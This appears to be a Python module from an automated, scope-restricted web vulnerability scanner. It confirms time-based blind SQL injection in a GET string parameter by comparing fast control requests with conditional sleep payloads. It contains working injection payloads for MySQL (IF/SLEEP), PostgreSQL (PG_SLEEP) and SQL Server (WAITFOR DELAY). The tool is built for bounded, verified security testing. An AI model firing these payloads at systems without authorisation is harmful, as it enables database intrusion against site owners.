"""Conservative time-based (blind) SQLi proof for an observed string GET field.

Boolean and error recipes fail silently against endpoints that neither reflect
the query nor surface a database diagnostic. Time-based inference is the last
bounded lane: a server-owned conditional payload that sleeps only on a true
condition, run against fast negative controls.

Discipline mirrors ``sqli_string``:

* Payloads are server-owned. The model never supplies bytes; it only selects a
  mapped, ordinary observed input. A fresh execution nonce is folded into the
  condition so the true/false branches are genuinely different queries and so an
  independent verifier cannot reuse the hunter's request.
* The proof is a *differential*: the two true branches must each run slow while
  every baseline and false control runs fast, and the slow/fast gap must reflect
  the injected delay. An endpoint that is merely slow (uniform latency) can never
  satisfy it, and a wrong database family fails safe (no sleep -> no confirmation)
  rather than producing a false positive.
* An independent verifier must repeat the successful recipe with a fresh nonce
  before a candidate can be published.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from urllib.parse import quote, urlsplit, urlunsplit

from .browser import assert_in_scope, origin
from .browser_actions import allowed_discovery_path
from .http_observe import observe_get
from .sqli_string import (
    _DIGEST,
    _SAFE_VALUE,
    _observed_value,
    and_fallback_eligible,
    observed_query_encoding,
)

# One fixed, bounded delay. Kept well under observe_get's 15s socket timeout so a
# genuine sleep completes while a naturally slow endpoint cannot be mistaken for
# one. Expressed in whole seconds because every supported family takes seconds.
DELAY_SECONDS = 3
DELAY_MS = DELAY_SECONDS * 1000
_SLOW_MS = int(DELAY_MS * 0.6)   # a true branch must take at least this long
_FAST_MS = int(DELAY_MS * 0.4)   # a control must stay under this
_GAP_MS = int(DELAY_MS * 0.5)    # slowest control -> fastest true branch

TIME_CHECK_ORDER = (
    "baseline_first", "false_first", "true_first",
    "false_second", "true_second", "baseline_last",
)
# Ordered small set of families to try. Each is attempted at most once; the tool
# stops at the first confirmation. A family whose syntax does not match simply
# never sleeps, so the recipe fails safe instead of mis-attributing a delay.
FAMILIES = ("mysql", "postgresql", "sqlserver")


def _conditional_suffix(family: str, condition_true: bool, nonce: str, false_nonce: str) -> str:
    """Build one server-owned, single-statement time payload for ``family``.

    The nonce comparison is the whole condition: ``N=N`` is always true, ``N=M``
    always false, so only the true branch reaches the sleep primitive.
    """
    left, right = nonce, (nonce if condition_true else false_nonce)
    if family == "mysql":
        body = f"' AND IF({left}={right},SLEEP({DELAY_SECONDS}),0)-- "
    elif family == "postgresql":
        body = (f"' AND 1=(CASE WHEN ({left}={right}) "
                f"THEN (SELECT 1 FROM PG_SLEEP({DELAY_SECONDS})) ELSE 1 END)-- ")
    elif family == "sqlserver":
        body = f"'; IF({left}={right}) WAITFOR DELAY '0:0:{DELAY_SECONDS}'-- "
    else:
        raise ValueError("unsupported_sql_family")
    return quote(body, safe="")


def plan_string_time(
    url: str, *, parameter: str, allowed_origins: list[str], family: str,
) -> tuple[str, dict[str, str], str]:
    """Change only one observed, ordinary string field; preserve other query bytes."""
    if family not in FAMILIES:
        raise ValueError("unsupported_sql_family")
    assert_in_scope(url, allowed_origins)
    parts = urlsplit(url)
    if parts.fragment or len(url) > 2048 or len(parts.query) > 2048:
        raise ValueError("A bounded fragment-free observed GET URL is required")
    if not allowed_discovery_path(parts.path or "/"):
        raise ValueError("State-changing path is not eligible for SQLi proof")
    fields = parts.query.split("&")
    if len(fields) > 40 or not isinstance(parameter, str) or not 0 < len(parameter) <= 80:
        raise ValueError("A single bounded query parameter is required")
    from urllib.parse import unquote_plus

    matches = [i for i, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("String parameter must occur exactly once")
    index = matches[0]
    name, sep, raw_value = fields[index].partition("=")
    value, encoding = _observed_value(raw_value) if sep else ("", "plain")
    if not _SAFE_VALUE.fullmatch(value):
        raise ValueError("Time-based SQLi proof requires an ordinary observed string value")
    nonce = str(secrets.randbelow(90000) + 10000)
    false_nonce = nonce[:-1] + str((int(nonce[-1]) + 1) % 10)

    def variant(condition_true: bool) -> str:
        suffix = _conditional_suffix(family, condition_true, nonce, false_nonce)
        changed = fields.copy()
        if encoding == "base64":
            import base64
            decoded_suffix = unquote_plus(suffix)
            encoded = base64.b64encode((value + decoded_suffix).encode()).decode()
            changed[index] = name + "=" + quote(encoded, safe="")
        else:
            changed[index] = name + "=" + raw_value + suffix
        target = urlunsplit(parts._replace(query="&".join(changed)))
        assert_in_scope(target, allowed_origins)
        return target

    true_url, false_url = variant(True), variant(False)
    variants = {
        "baseline_first": url,
        "false_first": false_url,
        "true_first": true_url,
        "false_second": false_url,
        "true_second": true_url,
        "baseline_last": url,
    }
    return url, variants, nonce


def time_followup_eligible(or_result: dict) -> bool:
    """Only attempt the timing lane when the Boolean OR baselines were stable.

    ``and_fallback_eligible`` already proves the endpoint answered both baseline
    probes with a 200, a stable size, and no redirect/truncation. Reusing it keeps
    the timing lane off flaky or error-y endpoints where latency means nothing.
    """
    return and_fallback_eligible(or_result)


def time_sql_proof_valid(result: dict) -> bool:
    if (result.get("operation") != "sqli_time_string"
            or result.get("proof_recipe") != "string_time_v1"
            or result.get("method") != "GET" or result.get("location") != "query"
            or not result.get("target") or not result.get("parameter")
            or result.get("sql_family") not in FAMILIES
            or result.get("input_encoding", "plain") not in {"plain", "base64"}
            or not re.fullmatch(r"[1-9][0-9]{4}", str(result.get("nonce", "")))
            or result.get("requests_sent") != len(TIME_CHECK_ORDER)):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or any(
        not isinstance(checks.get(key), dict) for key in TIME_CHECK_ORDER
    ):
        return False
    rows = {key: checks[key] for key in TIME_CHECK_ORDER}
    if any(row.get("status") != 200 or row.get("truncated") is not False
           or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("elapsed_ms"), int) or row["elapsed_ms"] < 0
           for row in rows.values()):
        return False
    content_type = rows["baseline_first"].get("content_type")
    if not content_type or any(row.get("content_type") != content_type
                               for row in rows.values()):
        return False
    controls = (rows["baseline_first"], rows["false_first"],
                rows["false_second"], rows["baseline_last"])
    trues = (rows["true_first"], rows["true_second"])
    control_max = max(row["elapsed_ms"] for row in controls)
    true_min = min(row["elapsed_ms"] for row in trues)
    # Fast negatives, slow repeated positives, and a gap that reflects the
    # injected delay. The gap is what rules out a uniformly slow endpoint:
    # base latency cancels because true/false run the same query but for SLEEP.
    return (control_max <= _FAST_MS
            and true_min >= _SLOW_MS
            and true_min - control_max >= _GAP_MS)


def probe_string_time(
    baseline: str, variants: dict[str, str], nonce: str, *, parameter: str,
    family: str, allowed_origins: list[str], storage_state: dict | None,
    before_request: Callable[[], object],
) -> dict:
    checks = {}
    for key in TIME_CHECK_ORDER:
        before_request()
        response = observe_get(variants[key], allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated",
            "body_sha256", "redirected", "elapsed_ms",
        )}
    return build_string_time_result(
        baseline, nonce, parameter=parameter, family=family, checks=checks,
    )


def build_string_time_result(baseline: str, nonce: str, *, parameter: str,
                             family: str, checks: dict[str, dict],
                             browser_replay: bool = False) -> dict:
    """Evaluate the timing controls from direct or live browser GETs."""
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_time_string", "proof_recipe": "string_time_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "sql_family": family, "delay_ms": DELAY_MS,
        "requests_sent": len(TIME_CHECK_ORDER),
        "identity_transport": "named_identity_browser_state" if browser_replay
        else "named_identity_cookies_only",
        "checks": checks,
        "input_encoding": observed_query_encoding(baseline, parameter),
    }
    if browser_replay:
        result["replay_mode"] = "browser_live_get"
    result["proof_confirmed"] = time_sql_proof_valid(result)
    return result
